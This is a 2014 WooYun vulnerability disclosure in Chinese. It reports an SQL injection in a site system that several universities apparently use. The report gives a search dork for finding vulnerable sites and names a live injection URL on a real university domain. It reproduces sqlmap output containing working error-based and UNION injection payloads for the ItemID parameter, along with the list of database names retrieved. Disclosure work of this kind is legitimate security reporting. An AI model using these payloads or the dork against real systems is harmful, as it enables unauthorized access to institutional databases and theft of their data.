wybug_title: 某多所大学在用系统一处sql注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-09-10：	细节已通知厂商并且等待厂商处理中									2014-09-15：	厂商已经确认，细节仅向厂商公开									2014-09-18：	细节向第三方安全合作伙伴开放									2014-11-09：	细节向核心白帽子及相关领域专家公开									2014-11-19：	细节向普通白帽子公开									2014-11-29：	细节向实习白帽子公开									2014-12-09：	细节向公众公开  简要描述： rt 详细说明：  貌似是一个西安的建站公司。关键词
inurl:/Docs/Commentlist.aspx?ItemID=
举几个例子
注入地址:http://ndxbskb.imu.edu.cn/mwb/Docs/Commentlist.aspx?ItemID=22    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:20:44[16:20:45] [INFO] using 'C:\Users\Administrator\Desktop\渗透工具\sqlmap GUI汉化版\rar\output\ndxbskb.imu.edu.cn\session' as session file[16:20:45] [INFO] testing connection to the target url[16:20:45] [INFO] testing if the url is stable, wait a few seconds[16:20:47] [INFO] url is stable[16:20:47] [INFO] testing if GET parameter 'ItemID' is dynamic[16:20:47] [WARNING] GET parameter 'ItemID' appears to be not dynamic[16:20:48] [INFO] heuristic test shows that GET parameter 'ItemID' might be injectable (possible DBMS: Microsoft SQL Server)[16:20:48] [INFO] testing sql injection on GET parameter 'ItemID'[16:20:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'parsed error message(s) showed that the back-end DBMS could be Microsoft SQL Server. Do you want to skip test payloads specific for other DBMSes? [Y/n] y[16:21:21] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[16:21:22] [INFO] GET parameter 'ItemID' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause' injectable[16:21:22] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[16:21:28] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[16:21:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[16:21:34] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for UNION query injection technique[16:21:56] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the request[16:21:56] [WARNING] most probably web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for few minutes and rerun without flag T in option '--technique' (e.g. --flush-session --technique=BEUS) or try to lower the value of option '--time-sec' (e.g. --time-sec=2)[16:22:01] [INFO] target url appears to have 19 columns in query[16:22:03] [INFO] GET parameter 'ItemID' is 'Generic UNION query (NULL) - 1 to 10 columns' injectableGET parameter 'ItemID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 22 HTTP(s) requests:---Place: GETParameter: ItemID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: ItemID=22 AND 5909=CONVERT(INT,(CHAR(58)+CHAR(97)+CHAR(102)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (5909=5909) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(121)+CHAR(116)+CHAR(119)+CHAR(58)))    Type: UNION query    Title: Generic UNION query (NULL) - 19 columns    Payload: ItemID=22 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(97)+CHAR(102)+CHAR(115)+CHAR(58)+CHAR(116)+CHAR(121)+CHAR(84)+CHAR(118)+CHAR(83)+CHAR(67)+CHAR(71)+CHAR(84)+CHAR(81)+CHAR(75)+CHAR(58)+CHAR(121)+CHAR(116)+CHAR(119)+CHAR(58)-----[16:23:18] [INFO] testing Microsoft SQL Server[16:23:19] [INFO] confirming Microsoft SQL Server[16:23:20] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[16:23:20] [INFO] fetching database names[16:23:21] [INFO] the SQL query used returns 8 entries[16:23:21] [INFO] retrieved: "master"[16:23:21] [INFO] retrieved: "model"[16:23:22] [INFO] retrieved: "msdb"[16:23:22] [INFO] retrieved: "nmgskb"[16:23:23] [INFO] retrieved: "nmgzkb"[16:23:23] [INFO] retrieved: "ReportServer$SQLEXPRESS"[16:23:24] [INFO] retrieved: "ReportServer$SQLEXPRESSTempDB"[16:23:24] [INFO] retrieved: "tempdb"available databases [8]:[*] master[*] model[*] msdb[*] nmgskb[*] nmgzkb[*] ReportServer$SQLEXPRESS[*] ReportServer$SQLEXPRESSTempDB[*] tempdb[16:23:24] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 26 times[16:23:24] [INFO] Fetched data logged to text files under 'C:\Users\Administrator\Desktop\渗透工具\sqlmap GUI汉化版\rar\output\ndxbskb.imu.edu.cn'[*] shutting down at 16:23:24
